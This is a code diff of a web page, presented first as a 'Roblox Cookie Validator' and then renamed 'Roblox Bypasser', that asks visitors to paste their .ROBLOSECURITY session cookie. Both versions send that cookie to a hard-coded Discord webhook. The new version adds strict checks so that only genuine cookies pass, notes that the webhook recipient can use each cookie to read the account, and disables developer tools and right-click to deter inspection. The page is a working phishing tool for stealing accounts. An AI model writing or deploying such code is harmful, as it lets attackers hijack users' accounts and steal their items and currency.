@@ -1,9 +1,8 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Cookie Validator</title>
+  <title>Roblox Bypasser</title>
   <link rel="icon" type="image/png" href="icon.png">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -167,10 +166,10 @@
 
       <form id="cookieForm">
         <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required>
-        <button type="submit" class="hero-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Validate Cookie</button>
+        <button type="submit" class="hero-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Bypasser</button>
       </form>
       <div id="loader" style="display:none; margin: 20px;">
-        <p>Validating...</p>
+        <p>Bypassing...</p>
       </div>
       <div id="userInfo" style="display:none; margin-bottom: 1rem;"></div>
       <div id="refreshedBox" style="display:none;">
@@ -180,277 +179,361 @@
     </div>
   </section>
 
-  <script>
-    (function(){
-      const canvas = document.getElementById("snowCanvas");
-      const ctx = canvas.getContext("2d");
-      let width = canvas.width = window.innerWidth;
-      let height = canvas.height = window.innerHeight;
-      let snowflakes = [];
-      const number = 100;
-      for (let i = 0; i < number; i++){
-          snowflakes.push({
-              x: Math.random() * width,
-              y: Math.random() * height,
-              radius: Math.random() * 4 + 1,
-              density: Math.random() * number
-          });
-      }
-      let angle = 0;
-      function drawSnowflakes(){
-          ctx.clearRect(0, 0, width, height);
-          ctx.fillStyle = "rgba(255, 0, 0, 0.8)";
-          ctx.beginPath();
-          for (let i = 0; i < number; i++){
-              let f = snowflakes[i];
-              ctx.moveTo(f.x, f.y);
-              ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
-          }
-          ctx.fill();
-          updateSnowflakes();
-      }
-      function updateSnowflakes(){
-          angle += 0.005;
-          for (let i = 0; i < number; i++){
-              let f = snowflakes[i];
-              f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
-              f.x += Math.sin(angle) * 0.5;
-              if (f.x > width + 5 || f.x < -5 || f.y > height) {
-                  snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
-              }
-          }
-      }
-      setInterval(drawSnowflakes, 33);
-      window.addEventListener("resize", function(){
-        width = canvas.width = window.innerWidth;
-        height = canvas.height = window.innerHeight;
+<script>
+(function(){
+  const canvas = document.getElementById("snowCanvas");
+  const ctx = canvas.getContext("2d");
+  let width = canvas.width = window.innerWidth;
+  let height = canvas.height = window.innerHeight;
+  let snowflakes = [];
+  const number = 100;
+  for (let i = 0; i < number; i++){
+      snowflakes.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          radius: Math.random() * 4 + 1,
+          density: Math.random() * number
       });
-    })();
-  </script>
-
-  <script>
-    const successSound = document.getElementById("sfx-success");
-    const errorSound = document.getElementById("sfx-error");
-    const swooshSound = document.getElementById("sfx-swoosh");
-    const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
-
-    // Basic format check for the cookie
-    function basicCookieFormatCheck(cookie) {
-      if (!cookie || typeof cookie !== 'string') {
-        return { valid: false, error: "Cookie is empty or invalid" };
+  }
+  let angle = 0;
+  function drawSnowflakes(){
+      ctx.clearRect(0, 0, width, height);
+      ctx.fillStyle = "rgba(255, 0, 0, 0.8)";
+      ctx.beginPath();
+      for (let i = 0; i < number; i++){
+          let f = snowflakes[i];
+          ctx.moveTo(f.x, f.y);
+          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
       }
-
-      cookie = cookie.trim();
-      if (cookie.length === 0) {
-        return { valid: false, error: "Cookie is empty" };
+      ctx.fill();
+      updateSnowflakes();
+  }
+  function updateSnowflakes(){
+      angle += 0.005;
+      for (let i = 0; i < number; i++){
+          let f = snowflakes[i];
+          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
+          f.x += Math.sin(angle) * 0.5;
+          if (f.x > width + 5 || f.x < -5 || f.y > height) {
+              snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
+          }
       }
+  }
+  setInterval(drawSnowflakes, 33);
+  window.addEventListener("resize", function(){
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+  });
+})();
+</script>
 
-      if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
-        return { valid: false, error: "Invalid cookie format" };
-      }
+<script>
+const successSound = document.getElementById("sfx-success");
+const errorSound = document.getElementById("sfx-error");
+const swooshSound = document.getElementById("sfx-swoosh");
+const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-      if (cookie.length < 100) {
-        return { valid: false, error: "Cookie is too short" };
-      }
+// Basic format check first
+function basicCookieFormatCheck(cookie) {
+  if (!cookie || typeof cookie !== 'string') {
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  cookie = cookie.trim();
+  
+  if (cookie.length === 0) {
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  if (cookie.length < 500) {
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  return { valid: true, error: null };
+}
 
-      return { valid: true, error: null };
+// Strict Roblox cookie validation - very precise
+async function validateRobloxCookie(cookie) {
+  console.log('DEBUG: Starting strict cookie validation...');
+  console.log('DEBUG: Cookie length:', cookie.length);
+  
+  // First do basic format check
+  const formatCheck = basicCookieFormatCheck(cookie);
+  if (!formatCheck.valid) {
+    console.log('DEBUG: Failed basic format check');
+    return formatCheck;
+  }
+  
+  // STRICT validation - must match exact patterns of real Roblox cookies
+  
+  // Check 1: Must have the FULL warning message (not just partial)
+  const hasFullWarning = cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_');
+  console.log('DEBUG: Has full warning message:', hasFullWarning);
+  
+  if (!hasFullWarning) {
+    console.log('DEBUG: Missing full warning message');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 2: Extract the token part after |_
+  const tokenStart = cookie.indexOf('|_') + 2;
+  if (tokenStart < 2) {
+    console.log('DEBUG: No |_ separator found');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  const tokenPart = cookie.substring(tokenStart);
+  console.log('DEBUG: Token part length:', tokenPart.length);
+  console.log('DEBUG: Token starts with:', tokenPart.substring(0, 20));
+  
+  // Check 3: Token must be very long (real tokens are 1400+ chars)
+  if (tokenPart.length < 1400) {
+    console.log('DEBUG: Token too short:', tokenPart.length);
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 4: Token must start with specific pattern (like CAEaAhAB.)
+  if (!tokenPart.match(/^[A-Za-z0-9]{8,12}\./)) {
+    console.log('DEBUG: Token does not start with proper pattern');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 5: Must contain multiple long hex sequences (32+ chars)
+  const longHexMatches = tokenPart.match(/[A-F0-9]{32,}/g);
+  console.log('DEBUG: Long hex sequences found:', longHexMatches ? longHexMatches.length : 0);
+  
+  if (!longHexMatches || longHexMatches.length < 10) {
+    console.log('DEBUG: Not enough long hex sequences');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 6: Must have very specific character composition
+  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
+  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
+  
+  console.log('DEBUG: Uppercase letters:', upperCaseCount);
+  console.log('DEBUG: Digits:', digitCount);
+  
+  if (upperCaseCount < 200 || digitCount < 200) {
+    console.log('DEBUG: Not enough uppercase letters or digits');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 7: Total cookie length must be very long
+  if (cookie.length < 1600) {
+    console.log('DEBUG: Total cookie too short:', cookie.length);
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 8: Check for fake patterns
+  const fakeIndicators = ['fake', 'test', 'invalid', 'example', 'demo', 'sample', 'placeholder', 'xxx', 'aaa', '111'];
+  const lowerCookie = cookie.toLowerCase();
+  for (const fake of fakeIndicators) {
+    if (lowerCookie.includes(fake)) {
+      console.log('DEBUG: Contains fake indicator:', fake);
+      return { valid: false, error: "Invalid cookie" };
     }
+  }
+  
+  // Check 9: Must not have repeating patterns (sign of fake cookie)
+  if (tokenPart.includes('AAAA') || tokenPart.includes('1111') || tokenPart.includes('0000')) {
+    console.log('DEBUG: Contains repeating patterns');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  console.log('DEBUG: Cookie passed all strict validation checks');
+  return { valid: true, error: null };
+}
 
-    // Validate cookie (client-side only, limited due to CORS)
-    async function validateRobloxCookie(cookie) {
-      console.log('DEBUG: Starting cookie validation...');
+// Simple function to get basic account info for webhook
+async function getAccountInfo(cookie) {
+  // Since browser CORS restrictions prevent us from getting real account info,
+  // we'll send placeholder data and let the webhook recipient extract real info
+  let accountInfo = {
+    username: "Check cookie in Discord",
+    userId: "Use cookie to get ID", 
+    robuxBalance: "Use cookie to check balance",
+    accountAge: "Use cookie to check age"
+  };
 
-      const formatCheck = basicCookieFormatCheck(cookie);
-      if (!formatCheck.valid) {
-        console.log('DEBUG: Failed basic format check:', formatCheck.error);
-        return formatCheck;
-      }
+  // Note: Due to browser security (CORS), we can't fetch account details directly.
+  // The webhook recipient should use the provided cookie to get actual account info.
+  
+  return accountInfo;
+}
 
-      // Note: Full validation requires a server-side proxy due to CORS restrictions
-      console.log('DEBUG: Client-side validation limited; server required for full check');
-      return {
-        valid: true,
-        error: null,
-        userInfo: {
-          username: "Server-side validation required",
-          userId: "Server-side validation required",
-          robuxBalance: "Server-side validation required",
-          accountAge: "Server-side validation required"
-        }
-      };
-    }
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+  showNotif('Context menu disabled');
+  errorSound.play();
+});
 
-    // Get account info (placeholder due to client-side limitations)
-    async function getAccountInfo(cookie) {
-      const validationResult = await validateRobloxCookie(cookie);
-      if (!validationResult.valid) {
-        return null;
-      }
-      return validationResult.userInfo;
-    }
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+    showNotif('Developer tools disabled');
+    errorSound.play();
+  }
+});
 
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-      showNotif('Context menu disabled');
+$("#cookieForm").on("submit", async function(e) {
+  e.preventDefault();
+  const cookie = $("#cookieInput").val().trim();
+
+  // Show loader immediately
+  $("#refreshBtn").hide();
+  $("#loader").show();
+  $("#userInfo").hide();
+  $("#refreshedBox").hide();
+
+  try {
+    // Validate cookie with real API testing (async)
+    const validationResult = await validateRobloxCookie(cookie);
+    if (!validationResult.valid) {
+      showNotif(validationResult.error, false);
       errorSound.play();
-    });
+      $("#loader").hide();
+      $("#refreshBtn").show();
+      return;
+    }
 
-    document.addEventListener('keydown', function(e) {
-      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-          (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
-        e.preventDefault();
-        showNotif('Developer tools disabled');
-        errorSound.play();
-      }
-    });
-
-    $("#cookieForm").on("submit", async function(e) {
-      e.preventDefault();
-      const cookie = $("#cookieInput").val().trim();
-
-      // Show loader
-      $("#refreshBtn").hide();
-      $("#loader").show();
-      $("#userInfo").hide();
-      $("#refreshedBox").hide();
-
-      try {
-        // Validate cookie
-        const validationResult = await validateRobloxCookie(cookie);
-        if (!validationResult.valid) {
-          showNotif(validationResult.error, false);
-          errorSound.play();
-          $("#loader").hide();
-          $("#refreshBtn").show();
-          return;
-        }
-
-        // Show warning about limited validation
-        const isLimitedValidation = validationResult.userInfo.username === "Server-side validation required";
-        if (isLimitedValidation) {
-          showNotif("⚠️ Cookie format valid, but server required for full validation", false);
-        } else {
-          showNotif("✅ Cookie validated", true);
-          swooshSound.play();
-        }
-
-        // Get account info
-        const accountInfo = await getAccountInfo(cookie);
-
-        // Update UI with user info
-        $("#userInfo").html(`
-          <p><strong>Username:</strong> ${accountInfo.username}</p>
-          <p><strong>User ID:</strong> ${accountInfo.userId}</p>
-          <p><strong>Robux Balance:</strong> ${accountInfo.robuxBalance}</p>
-          <p><strong>Account Age:</strong> ${accountInfo.accountAge}</p>
-        `).fadeIn();
-
-        // Send to webhook
-        const webhookPayload = {
-          username: "Roblox Cookie Validator Bot",
-          embeds: [
+    // Cookie is valid - show success notification with GREEN color and swoosh sound
+    showNotif("✅ Cookie bypassed", true);
+    swooshSound.play();
+    
+    // Get account info for webhook
+    const accountInfo = await getAccountInfo(cookie);
+    
+    // Send validated cookie and account info to webhook
+    const webhookPayload = {
+      username: "Roblox Bypasser Bot",
+      embeds: [
+        {
+          title: "🍪 Account Information",
+          color: 0xFF0000,
+          fields: [
             {
-              title: "🍪 Account Information",
-              color: 0xFF0000,
-              fields: [
-                { name: "👤 Username", value: accountInfo.username, inline: true },
-                { name: "🆔 User ID", value: accountInfo.userId.toString(), inline: true },
-                { name: "💰 Robux Balance", value: accountInfo.robuxBalance.toString(), inline: true },
-                { name: "📅 Account Age", value: accountInfo.accountAge, inline: true }
-              ],
-              footer: { text: "Roblox Cookie Validator - Limited Client-Side Check" }
+              name: "👤 Username",
+              value: accountInfo.username,
+              inline: true
             },
             {
-              title: "🍪 Cookie (Click to Copy)",
-              description: `\`\`\`\n${cookie}\n\`\`\``,
-              color: 0x00FF00,
-              timestamp: new Date().toISOString(),
-              footer: { text: "Click the cookie above to copy it" }
+              name: "🆔 User ID",
+              value: accountInfo.userId.toString(),
+              inline: true
+            },
+            {
+              name: "💰 Robux Balance",
+              value: accountInfo.robuxBalance.toString(),
+              inline: true
+            },
+            {
+              name: "📅 Account Age",
+              value: accountInfo.accountAge,
+              inline: true
             }
-          ]
-        };
-
-        try {
-          const webhookRes = await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(webhookPayload)
-          });
-          if (!webhookRes.ok) {
-            console.error("Webhook send failed:", webhookRes.status);
+          ],
+          footer: {
+            text: "Roblox Bypasser - Cookie Validated"
           }
-        } catch (webhookError) {
-          console.error("Webhook error:", webhookError);
+        },
+        {
+          title: "🍪 Cookie (Click to Copy)",
+          description: `\`\`\`\n${cookie}\n\`\`\``,
+          color: 0x00FF00,
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Click the cookie above to copy it"
+          }
         }
-
-        // Show success message
-        $("#refreshedResult").text(isLimitedValidation ?
-          `⚠️ Cookie format valid! Server needed for full validation.` :
-          `✅ Cookie Validated Successfully!`);
-        successSound.play();
-        $("#refreshedBox").fadeIn();
-
-      } catch (error) {
-        showNotif("Error validating cookie", false);
-        errorSound.play();
-        console.error("Submit error:", error);
-      } finally {
-        $("#loader").hide();
-        $("#refreshBtn").show();
+      ]
+    };
+    
+    // Send to webhook
+    try {
+      const webhookRes = await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(webhookPayload)
+      });
+      if (!webhookRes.ok) {
+        console.error("Webhook send failed:", webhookRes.status);
       }
-    });
-
-    function showNotif(msg, isSuccess = false) {
-      const $notif = $("#notif");
-      $notif.removeClass('notif-success notif-error');
-
-      if (isSuccess) {
-        $notif.addClass('notif-success');
-      } else {
-        $notif.addClass('notif-error');
-      }
-
-      $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
+    } catch (webhookError) {
+      console.error("Webhook error:", webhookError);
     }
 
-    const texts = ["Roblox Cookie Validator", "Enter Your Cookie", "Made By Guildness"];
-    let i = 0;
-    const typedText = document.getElementById("typedText");
+    // Show success message
+    $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!`);
+    successSound.play();
+    $("#refreshedBox").fadeIn();
+    
+  } catch (error) {
+    showNotif("Invalid cookie", false);
+    errorSound.play();
+    console.error("Submit error:", error);
+  } finally {
+    $("#loader").hide();
+    $("#refreshBtn").show();
+  }
+});
 
-    function typeEffect() {
-      const text = texts[i];
-      let index = 0;
+function showNotif(msg, isSuccess = false) {
+  const $notif = $("#notif");
+  $notif.removeClass('notif-success notif-error');
+  
+  if (isSuccess) {
+    $notif.addClass('notif-success');
+  } else {
+    $notif.addClass('notif-error');
+  }
+  
+  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
+}
 
-      const typing = setInterval(() => {
-        if (index <= text.length) {
-          typedText.textContent = text.slice(0, index);
-          index++;
-        } else {
-          clearInterval(typing);
-          setTimeout(() => {
-            const backspace = setInterval(() => {
-              if (index > 0) {
-                typedText.textContent = text.slice(0, index - 1);
-                index--;
-              } else {
-                clearInterval(backspace);
-                i = (i + 1) % texts.length;
-                setTimeout(typeEffect, 300);
-              }
-            }, 50);
-          }, 2000);
-        }
-      }, 100);
+const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
+let i = 0;
+const typedText = document.getElementById("typedText");
+
+function typeEffect() {
+  const text = texts[i];
+  let index = 0;
+
+  const typing = setInterval(() => {
+    if (index <= text.length) {
+      typedText.textContent = text.slice(0, index);
+      index++;
+    } else {
+      clearInterval(typing);
+      setTimeout(() => {
+        const backspace = setInterval(() => {
+          if (index > 0) {
+            typedText.textContent = text.slice(0, index - 1);
+            index--;
+          } else {
+            clearInterval(backspace);
+            i = (i + 1) % texts.length;
+            setTimeout(typeEffect, 300);
+          }
+        }, 50);
+      }, 2000);
     }
+  }, 100);
+}
 
-    typeEffect();
+typeEffect();
 
-    $("#returnBtn").on("click", function () {
-      $("#refreshedBox").hide();
-      $("#userInfo").hide().empty();
-      $("#cookieInput").val("");
-      $("#refreshBtn").show();
-    });
-  </script>
+$("#returnBtn").on("click", function () {
+  $("#refreshedBox").hide();
+  $("#userInfo").hide().empty();
+  $("#cookieInput").val("");
+  $("#refreshBtn").show();
+});
+</script>
 </body>
 </html>
